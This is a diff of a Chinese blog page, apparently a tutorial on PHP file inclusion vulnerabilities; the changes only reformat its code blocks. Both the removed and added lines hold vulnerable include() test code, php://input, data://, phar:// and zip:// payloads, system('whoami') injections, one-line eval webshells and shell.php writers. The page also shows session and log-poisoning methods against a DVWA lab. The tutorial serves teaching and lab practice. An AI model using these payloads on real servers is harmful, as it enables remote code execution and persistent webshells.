@@ -470,32 +470,26 @@
 <p><img src="9272355-7889a572371b18c8.png" alt=""></p>
 <h5 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h5><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。</p>
 <p>示例代码：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-       <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-       <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">       $filename=$GET[<span class="string">'filename'</span>];</span><br><span class="line">       <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p>
 <h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件包含分为：本地(LFI)/远程(RFI)包含</p>
 <p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
 <p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br> 但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
-<pre class=" language-undefined"><code class="language-undefined">allow_url_fopen = On
-allow_url_include = On，重启apache，即可生效</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen &#x3D; On</span><br><span class="line">allow_url_include &#x3D; On，重启apache，即可生效</span><br></pre></td></tr></table></figure>
+
 <p>两个配置选项均需要为On，才能远程包含文件成功。<br> 另外一台需要开启apache</p>
-<pre class=" language-kotlin"><code class="language-kotlin">apt<span class="token operator">-</span><span class="token keyword">get</span> install apache2
- <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">init</span><span class="token punctuation">.</span>d<span class="token operator">/</span>apache2 start</code></pre>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="keyword">get</span> install apache2</span><br><span class="line"> /etc/<span class="keyword">init</span>.d/apache2 start</span><br></pre></td></tr></table></figure>
+
 <p><img src="9272355-952116d80dc7f768%5B1%5D.png" alt=""></p>
 <p><img src="9272355-e288840e08e52b5e%5B1%5D.png" alt=""></p>
 <p> 注：在php.ini中，allow_url_fopen默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。<br> 下面例子中测试代码均为：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>allow_url_fopen 默认为 On<br> allow_url_include 默认为 Off<br> 若有特殊要求，会在利用条件里指出。</p>
 <h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><h5 id="一、无限制本地文件包含漏洞"><a href="#一、无限制本地文件包含漏洞" class="headerlink" title="一、无限制本地文件包含漏洞"></a>一、无限制本地文件包含漏洞</h5><p><strong>测试代码：</strong></p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-    <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename =$_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p><strong>常见的敏感信息目录：</strong></p>
 <p>window系统：</p>
 <ul>
@@ -520,14 +514,8 @@ allow_url_include = On，重启apache，即可生效</code></pre>
 <p>linux下的默认存储目录为/var/lib/php/session</p>
 <p><strong>利用过程</strong></p>
 <p>我们可以先使用文件包含上传恶意代码，比如</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$ctfs=$_GET[<span class="string">'ctfs'</span>];</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"username"</span>]=$ctfs;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-
-<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span><span class="token punctuation">;</span>
-
-<span class="token delimiter">?></span></code></pre>
 <p>此php会将获取到的GET型ctfs变量的值存入到session中。如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码。<br>我们构造：</p>
 <img src="QQ截图20200123104221.png" style="zoom:80%;" />
 
@@ -542,10 +530,8 @@ allow_url_include = On，重启apache，即可生效</code></pre>
 <h5 id="三、有限制本地文件包含漏洞绕过"><a href="#三、有限制本地文件包含漏洞绕过" class="headerlink" title="三、有限制本地文件包含漏洞绕过"></a>三、有限制本地文件包含漏洞绕过</h5><p><strong>%00截断</strong></p>
 <p>条件：magic_quotes_gpc=Off  并且php版本&lt;5.3.4</p>
 <p><strong>测试代码</strong></p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>当我们直接包含本地的test.txt时</p>
 <img src="QQ截图20200123113838.png" style="zoom:67%;" />
 
@@ -560,19 +546,19 @@ allow_url_include = On，重启apache，即可生效</code></pre>
 
 <p><strong>四、路径长度限制</strong></p>
 <p>条件：windows OS,点号需要长于256；linuxOS 长于4096</p>
-<pre><code>windows下目录最大长度为256字节，超出的部分会被丢弃；
-linux下目录最大长度为4096字节，超出的部分会被丢弃。</code></pre><p>测试代码：</p>
-<pre><code>&lt;?php
-   $filename =$_GET[&#39;filename&#39;];
-   include($filename . &quot;.html&quot;);
-   ?&gt;</code></pre><h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
-<pre><code>allow_url_fopen = On（是否允许打开远程文件）
-allow_url_include = On（是否允许include/require远程文件）</code></pre><p>示例：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows下目录最大长度为<span class="number">256</span>字节，超出的部分会被丢弃；</span><br><span class="line">linux下目录最大长度为<span class="number">4096</span>字节，超出的部分会被丢弃。</span><br></pre></td></tr></table></figure>
+
 <p>测试代码：</p>
-<pre><code>&lt;?php
-    $filename  = $_GET[&#39;filename&#39;];
-    include($filename);
-?&gt;</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200203191630.png" alt=""></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">   $filename =$_GET[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php">   <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span></span><br><span class="line"><span class="php">   <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">On</span>（是否允许打开远程文件）</span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">On</span>（是否允许include/require远程文件）</span><br></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<p>测试代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $filename  = $_GET[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span>($filename);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200203191630.png" alt=""></p>
 <h4 id="PHP伪协议在文件包含中的应用"><a href="#PHP伪协议在文件包含中的应用" class="headerlink" title="PHP伪协议在文件包含中的应用"></a>PHP伪协议在文件包含中的应用</h4><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。除了这些封装协议、还能通过stream_wrapper_register() 来注册自定义的封装协议。</p>
 <p><strong>php伪协议类别</strong></p>
 <ul>
@@ -604,35 +590,37 @@ allow_url_include = On（是否允许include/require远程文件）</code></pre>
 <p>用法：?file=php://input 数据利用POST传过去。</p>
 <p>利用条件：</p>
 <p>allow_url_include = On。<br> 对allow_url_fopen不做要求</p>
-<pre><code>&lt;?phpinfo();?&gt;
-&lt;?php system(&#39;whoami&#39;);?&gt;
-&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST[&#39;caidao&#39;];?&gt;)&quot;)?&gt;</code></pre><p>包含姿势：</p>
-<pre><code>index.php
-?file=php://input
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>phpinfo();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>php <span class="keyword">system</span>(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>php fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval(\$_POST['caidao'];?&gt;)"</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-POST:
-&lt;? phpinfo();?&gt;</code></pre><h5 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h5><p>​      碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>包含姿势：</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.php</span><br><span class="line">?<span class="keyword">file</span>=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h5><p>​      碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
 <p>测试代码：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span>
-<span class="token delimiter">?></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <img src="QQ截图20200203182852.png" style="zoom:67%;" />
 
 <h5 id="php-input-命令执行"><a href="#php-input-命令执行" class="headerlink" title="php://input(命令执行)"></a>php://input(命令执行)</h5><p>测试代码：</p>
-<pre><code>&lt;?php
-    $filename  = $_GET[&#39;filename&#39;];
-    include($filename);
-?&gt;</code></pre><p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $filename  = $_GET[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span>($filename);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200203183726.png" alt=""></p>
 <h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p>
 <p>利用条件：</p>
 <p>php版本大于等于php5.2<br> allow_url_fopen = On<br> allow_url_include = On</p>
 <p>示例1：</p>
-<pre><code>/index2.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre><p><img src="9272355-5449b681b9c47ddb%5B1%5D.png" alt=""></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index2.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="9272355-5449b681b9c47ddb%5B1%5D.png" alt=""></p>
 <p>执行命令：</p>
-<pre><code>index2.php?file=data:text/plain;&lt;?php system(&quot;whoami&quot;);?&gt;</code></pre><p><img src="9272355-0fce621191e72481%5B1%5D.png" alt=""></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index2.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain;<span class="meta">&lt;?</span>php <span class="keyword">system</span>(<span class="string">"whoami"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="9272355-0fce621191e72481%5B1%5D.png" alt=""></p>
 <p>示例2：</p>
-<pre><code>/index2.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<?php phpinfo() ?></p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index2.php?<span class="keyword">file</span>=data:<span class="keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+
+<p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<?php phpinfo() ?></p>
 <p><strong>包含session</strong></p>
 <p>利用条件：session文件路径已知，且其中内容部分可控。</p>
 <p>思路：结合phpmyadmin,因为phpmyadmin每次登录时，会带上session。</p>
@@ -640,15 +628,15 @@ POST:
 <p>session文件的绝对路径可在phpinfo中查看，session.save_path</p>
 <p><img src="9272355-1e7dd8fd1a028711%5B1%5D.png" alt=""></p>
 <p>常见的php-session存放位置还有这几个：</p>
-<pre class=" language-csharp"><code class="language-csharp"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
-<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
-<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID
-<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID</code></pre>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
+
 <p>使用以下命令可查看到session文件中的登录信息</p>
-<pre class=" language-csharp"><code class="language-csharp">strings <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php5<span class="token operator">/</span>sess_258c1be1b00d080bddc58d2896460542facb6f1f <span class="token operator">|</span> grep root</code></pre>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /<span class="keyword">var</span>/lib/php5/sess_258c1be1b00d080bddc58d2896460542facb6f1f | grep root</span><br></pre></td></tr></table></figure>
+
 <p><img src="9272355-940bb1d740bd0d47%5B1%5D.png" alt=""></p>
 <p>登录phpmyadmin时，用户名输入一句话木马，再包含session文件，可getshell</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'root'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="9272355-c833b1fd110b6170%5B1%5D.png" alt=""></p>
 <p><img src="9272355-5304d206d0b1fcc8%5B1%5D.png" alt=""></p>
 <p>使用菜刀连接<br> <a href="http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c" target="_blank" rel="noopener">http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c</a><br> 在浏览器里有你的cookie所以你可以直接去访问对应的文件包含页面，用菜刀的话是没有cookie的所以你没有办法去访问文件包含页面也就是fi那个页面。所以说会自动跳转到登录页面，显示200ok</p>
@@ -666,8 +654,12 @@ POST:
 </ul>
 <p><img src="9272355-041eece378dca1e4.png" alt=""></p>
 <p>指定绝对路径：</p>
-<pre><code>index2.php?file=phar://C:\phpStudy\WWW\FileInclusion\phpinfo.zip\phpinfo.txt</code></pre><p>或者利用相对路径（这里phpinfo.zip就在当前目录下）</p>
-<pre><code>index2.php?file=phar://phpinfo.zip/phpinfo.txt</code></pre><p><img src="9272355-489da319d283d845.png" alt=""></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index2.php?file=phar://C:<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW<span class="symbol">\F</span>ileInclusion<span class="symbol">\p</span>hpinfo.zip<span class="symbol">\p</span>hpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p>或者利用相对路径（这里phpinfo.zip就在当前目录下）</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index2.php?<span class="keyword">file</span>=phar:<span class="comment">//phpinfo.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="9272355-489da319d283d845.png" alt=""></p>
 <h5 id="zip：-伪协议"><a href="#zip：-伪协议" class="headerlink" title="zip：//伪协议"></a>zip：//伪协议</h5><ul>
 <li><p>php版本大于等于php5.3.0</p>
 </li>
@@ -678,8 +670,12 @@ POST:
 <li><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
 </li>
 </ul>
-<pre><code>index2.php?file=zip://C:\phpStudy\WWW\FileInclusion\phpinfo.zip%23phpinfo.txt</code></pre><h4 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h4><p>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马a.jpg，内容为：</p>
-<pre><code>&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[tzc]);?&gt;&quot;)?&gt;</code></pre><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index2.php?file=zip://C:<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW<span class="symbol">\F</span>ileInclusion<span class="symbol">\p</span>hpinfo.zip<span class="variable">%23phpinfo.txt</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h4><p>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马a.jpg，内容为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval($_POST[tzc]);?&gt;"</span>)<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p>
 <ul>
 <li>1.日志的物理存放路径</li>
 <li>2.存在文件包含漏洞</li>
@@ -687,30 +683,34 @@ POST:
 <p>获取日志存放路径</p>
 <p>（一）日志默认路径</p>
 <p>(1) apache+Linux日志默认路径</p>
-<pre class=" language-undefined"><code class="language-undefined">    /etc/httpd/logs/access_log</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log</span><br></pre></td></tr></table></figure>
+
 <p>或者</p>
-<pre class=" language-bash"><code class="language-bash">    /var/log/httpd/access_log</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/<span class="built_in">log</span>/httpd/access_log</span><br></pre></td></tr></table></figure>
+
 <p>(2) apache+win2003日志默认路径</p>
-<pre class=" language-cpp"><code class="language-cpp">    D<span class="token operator">:</span>\xampp\apache\logs\access<span class="token punctuation">.</span>log
-    D<span class="token operator">:</span>\xampp\apache\logs\error<span class="token punctuation">.</span>log</code></pre>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\xampp\apache\logs\access.<span class="built_in">log</span></span><br><span class="line">D:\xampp\apache\logs\error.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>
+
 <p>(3) IIS6.0+win2003默认日志文件</p>
-<pre class=" language-undefined"><code class="language-undefined">    C:\WINDOWS\system32\Logfiles</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\Logfiles</span><br></pre></td></tr></table></figure>
+
 <p>(4) IIS7.0+win2003 默认日志文件</p>
-<pre class=" language-undefined"><code class="language-undefined">    %SystemDrive%\inetpub\logs\LogFiles</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemDrive%\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure>
+
 <p>(5) nginx 日志文件</p>
-<pre class=" language-bash"><code class="language-bash">    日志文件在用户安装目录logs目录下
-            以我的安装路径为例/usr/local/nginx,
-            那我的日志目录就是在/usr/local/nginx/logs里</code></pre>
